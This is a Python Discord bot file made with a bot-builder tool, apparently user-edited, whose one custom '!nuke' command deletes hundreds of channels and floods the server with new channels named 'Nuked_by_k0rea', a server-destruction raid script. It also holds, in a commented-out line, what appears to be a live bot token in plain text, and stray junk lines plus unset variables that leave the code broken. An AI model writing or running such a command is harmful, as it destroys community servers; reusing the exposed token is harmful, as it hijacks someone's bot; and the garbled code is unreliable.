# Easy Discord Bot Builderによって作成されました！ 製作：@himais0giiiin
# Created with Easy Discord Bot Builder! created by @himais0giiiin!
# Optimized Version

import discord
from discord import app_commands
from discord.ext import commands
import random
import asyncio
import datetime
import math
import json
import os
import logging

# ロギング設定 (Logging Setup)
# INFOレベル以上のログをコンソールに出力します
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

intents = discord.Intents.default()
intents.message_content = True 
intents.members = True 

# Botの作成
bot = commands.Bot(command_prefix='!', intents=intents)

# グローバルエラーハンドラー
@bot.event
async def on_command_error(ctx, error):
    # コマンドが見つからないエラーは無視する (他のBotと競合しないように)
    if isinstance(error, commands.CommandNotFound):
        return
    # その他のエラーはログに出力
    logging.error(f"Command Error: {error}")
    # 開発用にメッセージを返すことも可能です (運用時はコメントアウト推奨)
    # await ctx.send(f"⚠️ エラーが発生しました: {error}")

# ---JSON操作---
def _load_json_data(filename):
    if not os.path.exists(filename):
        return {}
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        logging.error(f"JSON Load Error: {e}")
        return {}

def _save_json_data(filename, data):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        logging.error(f"JSON Save Error: {e}")
# ----------------------------

# --- ユーザー作成部分 ---
import math

Nuked_by_k0rea = None
random2 = None



@bot.command(name='nuke')
async def nuke_cmd(ctx):
    user = ctx.author
    if False or True:
        for count in range(500):

            _ch = bot.get_channel(int(random2))
            if _ch:
                await _ch.delete()
    for count2 in range(120):

        if 'ctx' in locals() and ctx.guild:
            await ctx.guild.create_text_channel(name=Nuked_by_k0rea)

0 == 0

round(0)

0

# --------------------------

if __name__ == "__main__":
    # Token check
    # bot.run('MTQyNTQ0ODU0MjUyODQ3NTIwNw.GMPL31.tLYzEazJWhz4i_eCPyvmuswt5QEi574zc-bSaI') # 実行時はここにTokenを入れてください!
    pass
